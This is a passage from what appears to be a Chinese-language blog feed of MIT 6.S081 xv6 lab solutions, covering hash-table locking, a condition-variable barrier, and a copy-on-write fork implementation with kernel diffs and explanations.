punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>key <span class="token operator">==</span> key<span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>locks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// lock</span><span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// update the existing key.</span>    e<span class="token operator">-></span>value <span class="token operator">=</span> value<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// the new is new.</span>    <span class="token function">insert</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token operator">&amp;</span>table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>locks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// unlock</span></code></pre><p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/lock3.png"></p><p>可见，效率又有进一步提升。</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/notxv6/ph.c b/notxv6/ph.cindex 82afe76..321e269 100644<span class="token coord">--- a/notxv6/ph.c</span><span class="token coord">+++ b/notxv6/ph.c</span>@@ -17,6 +17,7 @@ struct entry *table[NBUCKET];<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int keys[NKEYS];</span><span class="token prefix unchanged"> </span><span class="token line">int nthread = 1;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pthread_mutex_t locks[NBUCKET];</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">double</span><span class="token prefix unchanged"> </span><span class="token line">now()</span></span>@@ -47,6 +48,7 @@ void put(int key, int value)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    if (e->key == key)</span><span class="token prefix unchanged"> </span><span class="token line">      break;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  pthread_mutex_lock(&amp;locks[i]);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(e)&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    // update the existing key.</span><span class="token prefix unchanged"> </span><span class="token line">    e->value = value;</span></span>@@ -54,7 +56,7 @@ void put(int key, int value)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    // the new is new.</span><span class="token prefix unchanged"> </span><span class="token line">    insert(key, value, &amp;table[i], table[i]);</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  pthread_mutex_unlock(&amp;locks[i]);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">static struct entry*</span></span>@@ -118,6 +120,10 @@ main(int argc, char *argv[])<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    keys[i] = random();</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  for (int i = 0; i &lt; NBUCKET; ++i) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    pthread_mutex_init(&amp;locks[i], NULL);</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  //</span><span class="token prefix unchanged"> </span><span class="token line">  // first the puts</span><span class="token prefix unchanged"> </span><span class="token line">  //</span></span></code></pre><h1 id="Barrier"><a href="#Barrier" class="headerlink" title="Barrier"></a>Barrier</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>最后一个实验主要是熟悉 POSIX 线程库中条件变量（conditional variable）的使用，实现的思路比较简单：前 nthread - 1 个线程在条件变量上休眠，最后一个线程将休眠的所有进程进行唤醒。有关条件变量的用法可以参考 OSTEP：<a href="https://pages.cs.wisc.edu/~remzi/OSTEP/threads-cv.pdf">OSTEP: Condition Variables</a>.</p><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/notxv6/barrier.c b/notxv6/barrier.cindex 12793e8..e4fd03e 100644<span class="token coord">--- a/notxv6/barrier.c</span><span class="token coord">+++ b/notxv6/barrier.c</span>@@ -30,7 +30,18 @@ barrier()<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  // Block until all threads have called barrier() and</span><span class="token prefix unchanged"> </span><span class="token line">  // then increment bstate.round.</span><span class="token prefix unchanged"> </span><span class="token line">  //  </span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  pthread_mutex_lock(&amp;bstate.barrier_mutex);</span><span class="token prefix inserted">+</span><span class="token line">  ++bstate.nthread;</span><span class="token prefix inserted">+</span><span class="token line">  if (bstate.nthread == nthread) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    pthread_cond_broadcast(&amp;bstate.barrier_cond);</span><span class="token prefix inserted">+</span><span class="token line">++bstate.round;</span><span class="token prefix inserted">+</span><span class="token line">bstate.nthread = 0;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  else &#123;</span><span class="token prefix inserted">+</span><span class="token line">    pthread_cond_wait(&amp;bstate.barrier_cond, &amp;bstate.barrier_mutex);</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  pthread_mutex_unlock(&amp;bstate.barrier_mutex);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Uthread-switching-between-threads&quot;&gt;&lt;a href=&quot;#Uthread-switching-between-threads&quot; class=&quot;headerlink&quot; title=&quot;Uthread: switching between</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab Copy on-write</title>
    <link href="http://lordaeronesz.github.io/2024/08/13/MIT6.s081-2021-Lab%20Copy%20on-write/"/>
    <id>http://lordaeronesz.github.io/2024/08/13/MIT6.s081-2021-Lab%20Copy%20on-write/</id>
    <published>2024-08-13T03:45:11.000Z</published>
    <updated>2024-08-13T10:01:33.110Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Implement-copy-on-write"><a href="#Implement-copy-on-write" class="headerlink" title="Implement copy-on write"></a>Implement copy-on write</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>xv6 使用 <code>fork()</code> 系统调用创建子进程时，需要将父进程的地址空间进行 <strong>深拷贝</strong> ，即将页表和实际物理空间同时进行拷贝，以实现父进程和子进程地址空间的独立性。但很多时候，如 shell 程序，<code>fork()</code> 通常与 <code>exec()</code> 搭配使用，首先使用 <code>fork()</code> 创建子进程，随后在子进程中使用 <code>exec()</code> 将指定的程序加载到当前地址空间，这样在 <code>fork()</code> 中进行的地址空间拷贝就白白浪费了。</p><p>本实现要求实现一个写时复制（copy-on write）的 <code>fork()</code> 系统调用。具体来说，在进行虚拟内存拷贝时，不直接进行物理内存的拷贝，只是将父进程的页表复制给子进程，这样子进程和父进程的每个虚拟页面都指向了同一个物理页面，当子进程需要对某个虚拟页面进行写入时，为了保证父进程和子进程之间的独立性，子进程此时将进行物理内存的分配和拷贝，再进行写入。</p><h2 id="实现方案"><a href="#实现方案" class="headerlink" title="实现方案"></a>实现方案</h2><p>根据提示，可以将上述的写时复制的思路用 <strong>异常</strong> 的方式来实现。</p><p>首先可以利用页表项的 flags 中的 RSW 位来表示页表项是否为 COW 页，以便后续的异常处理。</p><p>修改 <code>uvmcopy()</code> ，将物理页面的分配操作去除，只是进行页表的拷贝，并将父进程和子进程的对应页表项的 PTE_W 置 0（以便在对 COW 页进行写入时陷入内核）、PTE_COW 置 1。</p><p>修改 <code>usertrap()</code>，当陷入内核时，内核通过查看 scause 寄存器（见下图）以及页表项的 PTE_W 和 PTE_COW 位，识别到陷入原因是发生在 COW 页上的 store page fault（寄存器值为 15）时，进行对应的异常处理：使用 <code>kalloc()</code> 为其分配物理页面，并将其页表项指向的物理地址数据拷贝到新分配的物理地址下，实现物理内存的拷贝。此时由于页表映射发生了改变，需要插入新的页表项，并删除旧的页表项。在处理了 COW 异常之后，该页面将不再是一个 COW 页，因此需要将 PTE_W 置 1、PTE_COW 置 0。</p><p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Copy%20on-write/pf.png"></p><p>为了后续实现的方便，可以将 COW 页的判断和 COW 页的异常处理分别封装为两个函数：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">iscowpage</span><span class="token punctuation">(</span><span class="token class-name">pagetable_t</span> pgtbl<span class="token punctuation">,</span> uint64 va<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>va <span class="token operator">>=</span> MAXVA<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token class-name">pte_t</span> <span class="token operator">*</span>pte <span class="token operator">=</span> <span class="token function">walk</span><span class="token punctuation">(</span>pgtbl<span class="token punctuation">,</span> va<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pte <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>pte <span class="token operator">&amp;</span> PTE_V<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>pte <span class="token operator">&amp;</span> PTE_U<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">*</span>pte <span class="token operator">&amp;</span> PTE_COW<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">cowfault</span><span class="token punctuation">(</span><span class="token class-name">pagetable_t</span> pagetable<span class="token punctuation">,</span> uint64 va<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    uint64 va0 <span class="token operator">=</span> <span class="token function">PGROUNDDOWN</span><span class="token punctuation">(</span>va<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">pte_t</span><span class="token operator">*</span> pte<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pte <span class="token operator">=</span> <span class="token function">walk</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    uint64 flags <span class="token operator">=</span> <span class="token function">PTE_FLAGS</span><span class="token punctuation">(</span><span class="token operator">*</span>pte<span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64 pa0 <span class="token operator">=</span> <span class="token function">PTE2PA</span><span class="token punctuation">(</span><span class="token operator">*</span>pte<span class="token punctuation">)</span><span class="token punctuation">;</span>    flags <span class="token operator">&amp;=</span> <span class="token punctuation">(</span><span class="token operator">~</span>PTE_COW<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// clear COW bit</span>    flags <span class="token operator">|=</span> PTE_W<span class="token punctuation">;</span>      <span class="token comment">// set write bit</span>    uint64 mem<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mem <span class="token operator">=</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span><span class="token function">kalloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">memmove</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>mem<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>pa0<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// remove old PTE</span>    <span class="token function">uvmunmap</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// install new PTE</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mappages</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">,</span> mem<span class="token punctuation">,</span> flags<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">kfree</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>mem<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>此外，还需要为每个物理页面引入 <strong>引用计数（reference count）</strong> ，页面创建时计数为 1，每次添加或移除指向该物理地址的页表项都增加或减少引用计数，当引用计数为 0 时释放该物理页面。这里有一个实现的技巧：将引用计数的减少放到 <code>kfree()</code> 中，在 <code>kfree()</code> 中根据引用计数的大小决定是否释放物理页面。</p><p>最后，也是很容易忽视的一点，修改 <code>copyout()</code> 以实现对 COW 页的支持。刚开始看到这个提示的时候我很疑惑，前面的工作貌似已经足够实现 COW 了，为什么还要修改 <code>copyout</code>？原来 xv6 对 COW 页进行写时复制都是基于 store page fault，即当尝试写入一个 PTE_W 为 0 的页面时触发异常，导致陷入内核，再由内核进行 COW 页面的异常处理，其中陷入内核的操作是由硬件自动来完成的，具体来说，是在虚实地址转换阶段由 MMU 来完成的。而 <code>copyout()</code> 是运行在内核态下的函数，其地址转换是由内核中的函数 <code>walk()</code> 来实现的，因而不会自动触发异常并交由异常处理程序来处理，而需要手动来完成。由于前面已经将 COW 页的判断和处理封装成了函数，因此对 <code>copyout()</code> 的修改很简单：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">iscowpage</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">cowfault</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> va0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/defs.h b/kernel/defs.hindex 3564db4..f5a9d8d 100644<span class="token coord">--- a/kernel/defs.h</span><span class="token coord">+++ b/kernel/defs.h</span>@@ -63,6 +63,7 @@ void            ramdiskrw(struct buf*);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void*           kalloc(void);</span><span class="token prefix unchanged"> </span><span class="token line">void            kfree(void *);</span><span class="token prefix unchanged"> </span><span class="token line">void            kinit(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">void            incrfcount(void*);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// log.c</span><span class="token prefix unchanged"> </span><span class="token line">void            initlog(int, struct superblock*);</span></span>@@ -145,6 +146,8 @@ void            trapinit(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void            trapinithart(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern struct spinlock tickslock;</span><span class="token prefix unchanged"> </span><span class="token line">void            usertrapret(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int             iscowpage(pagetable_t, uint64);</span><span class="token prefix inserted">+</span><span class="token line">int             cowfault(pagetable_t, uint64);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// uart.c</span><span class="token prefix unchanged"> </span><span class="token line">void            uartinit(void);</span></span>@@ -170,6 +173,7 @@ uint64          walkaddr(pagetable_t, uint64);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int             copyout(pagetable_t, uint64, char *, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">int             copyin(pagetable_t, char *, uint64, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">int             copyinstr(pagetable_t, char *, uint64, uint64);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pte_t*          walk(pagetable_t, uint64, int);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// plic.c</span><span class="token prefix unchanged"> </span><span class="token line">void            plicinit(void);</span></span>diff --git a/kernel/kalloc.c b/kernel/kalloc.cindex fa6a0ac..5872b85 100644<span class="token coord">--- a/kernel/kalloc.c</span><span class="token coord">+++ b/kernel/kalloc.c</span>@@ -14,6 +14,11 @@ void freerange(void *pa_start, void *pa_end);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern char end[]; // first address after kernel.</span><span class="token prefix unchanged"> </span><span class="token line">                   // defined by kernel.ld.</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define PA2RFIDX(pa) ((((uint64)pa) - KERNBASE) / PGSIZE)</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">int rfcount[(PHYSTOP - KERNBASE) / PGSIZE];</span><span class="token prefix inserted">+</span><span class="token line">struct spinlock rflock;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">struct run &#123;</span><span class="token prefix unchanged"> </span><span class="token line">  struct run *next;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span>@@ -27,6 +32,7 @@ void<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">kinit()</span><span class="token prefix unchanged"> </span><span class="token line">&#123;</span><span class="token prefix unchanged"> </span><span class="token line">  initlock(&amp;kmem.lock, "kmem");</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  initlock(&amp;rflock, "rflock");</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  freerange(end, (void*)PHYSTOP);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -51,15 +57,17 @@ kfree(void *pa)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(((uint64)pa % PGSIZE) != 0 || (char*)pa &lt; end || (uint64)pa >= PHYSTOP)</span><span class="token prefix unchanged"> </span><span class="token line">    panic("kfree");</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  // Fill with junk to catch dangling refs.</span><span class="token prefix deleted">-</span><span class="token line">  memset(pa, 1, PGSIZE);</span><span class="token prefix deleted">-</span><span class="token line"></span><span class="token prefix deleted">-</span><span class="token line">  r = (struct run*)pa;</span><span class="token prefix deleted">-</span><span class="token line"></span><span class="token prefix deleted">-</span><span class="token line">  acquire(&amp;kmem.lock);</span><span class="token prefix deleted">-</span><span class="token line">  r->next = kmem.freelist;</span><span class="token prefix deleted">-</span><span class="token line">  kmem.freelist = r;</span><span class="token prefix deleted">-</span><span class="token line">  release(&amp;kmem.lock);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  acquire(&amp;rflock);</span><span class="token prefix inserted">+</span><span class="token line">  if(--rfcount[PA2RFIDX(pa)] &lt;= 0)&#123;</span><span class="token prefix inserted">+</span><span class="token line">    memset(pa, 1, PGSIZE);</span><span class="token prefix inserted">+</span><span class="token line">    // Fill with junk to catch dangling refs.</span><span class="token prefix inserted">+</span><span class="token line">    r = (struct run*)pa;</span><span class="token prefix inserted">+</span><span class="token line">    acquire(&amp;kmem.lock);</span><span class="token prefix inserted">+</span><span class="token line">    r->next = kmem.freelist;</span><span class="token prefix inserted">+</span><span class="token line">    kmem.freelist = r;</span><span class="token prefix inserted">+</span><span class="token line">    release(&amp;kmem.lock);</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  release(&amp;rflock);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// Allocate one 4096-byte page of physical memory.</span></span>@@ -76,7 +84,15 @@ kalloc(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    kmem.freelist = r->next;</span><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;kmem.lock);</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  if(r)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  if(r) &#123;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    memset((char*)r, 5, PGSIZE); // fill with junk</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    rfcount[PA2RFIDX(r)] = 1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  return (void*)r;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">void incrfcount(void* pa)&#123;</span><span class="token prefix inserted">+</span><span class="token line">  acquire(&amp;rflock);</span><span class="token prefix inserted">+</span><span class="token line">  ++rfcount[PA2RFIDX(pa)];</span><span class="token prefix inserted">+</span><span class="token line">  release(&amp;rflock);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/kernel/riscv.h b/kernel/riscv.hindex 1691faf..a6ba9e7 100644<span class="token coord">--- a/kernel/riscv.h</span><span class="token coord">+++ b/kernel/riscv.h</span>@@ -343,6 +343,8 @@ sfence_vma()<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define PTE_W (1L &lt;&lt; 2)</span><span class="token prefix unchanged"> </span><span class="token line">#define PTE_X (1L &lt;&lt; 3)</span><span class="token prefix unchanged"> </span><span class="token line">#define PTE_U (1L &lt;&lt; 4) // 1 -> user can access</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define PTE_COW (1L &lt;&lt; 8) // 1 -> is a COW page</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// shift a physical address to the right place for a PTE.</span><span class="token prefix unchanged"> </span><span class="token line">#define PA2PTE(pa) ((((uint64)pa) >> 12) &lt;&lt; 10)</span></span>diff --git a/kernel/trap.c b/kernel/trap.cindex a63249e..0fb7687 100644<span class="token coord">--- a/kernel/trap.c</span><span class="token coord">+++ b/kernel/trap.c</span>@@ -29,6 +29,42 @@ trapinithart(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  w_stvec((uint64)kernelvec);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">int iscowpage(pagetable_t pgtbl, uint64 va) &#123;</span><span class="token prefix inserted">+</span><span class="token line">  if (va >= MAXVA) return 0;</span><span class="token prefix inserted">+</span><span class="token line">  pte_t *pte = walk(pgtbl, va, 0);</span><span class="token prefix inserted">+</span><span class="token line">  if (pte == 0) return 0;</span><span class="token prefix inserted">+</span><span class="token line">  if ((*pte &amp; PTE_V) == 0) return 0;</span><span class="token prefix inserted">+</span><span class="token line">  if ((*pte &amp; PTE_U) == 0) return 0;</span><span class="token prefix inserted">+</span><span class="token line">  return *pte &amp; PTE_COW;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">int cowfault(pagetable_t pagetable, uint64 va) &#123;</span><span class="token prefix inserted">+</span><span class="token line">  uint64 va0 = PGROUNDDOWN(va);</span><span class="token prefix inserted">+</span><span class="token line">  pte_t* pte;</span><span class="token prefix inserted">+</span><span class="token line">  if((pte = walk(pagetable, va0, 0)) == 0) return -1;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  uint64 flags = PTE_FLAGS(*pte);</span><span class="token prefix inserted">+</span><span class="token line">  uint64 pa0 = PTE2PA(*pte);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  flags &amp;= (~PTE_COW); // clear COW bit</span><span class="token prefix inserted">+</span><span class="token line">  flags |= PTE_W;      // set write bit</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  uint64 mem;</span><span class="token prefix inserted">+</span><span class="token line">  if ((mem = (uint64)kalloc()) == 0) return -1;</span><span class="token prefix inserted">+</span><span class="token line">  memmove((void *)mem, (void *)pa0, PGSIZE);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  // remove old PTE</span><span class="token prefix inserted">+</span><span class="token line">  uvmunmap(pagetable, va0, 1, 1);</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // install new PTE</span><span class="token prefix inserted">+</span><span class="token line">  if(mappages(pagetable, va0, PGSIZE, mem, flags) &lt; 0)&#123;</span><span class="token prefix inserted">+</span><span class="token line">    kfree((void *)mem);</span><span class="token prefix inserted">+</span><span class="token line">    return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//</span><span class="token prefix unchanged"> </span><span class="token line">// handle an interrupt, exception, or system call from user space.</span><span class="token prefix unchanged"> </span><span class="token line">// called from trampoline.S</span></span>@@ -67,7 +103,12 @@ usertrap(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    syscall();</span><span class="token prefix unchanged"> </span><span class="token line">  &#125; else if((which_dev = devintr()) != 0)&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    // ok</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  &#125; else &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  &#125; else if (r_scause() == 15 &amp;&amp; iscowpage(p->pagetable, 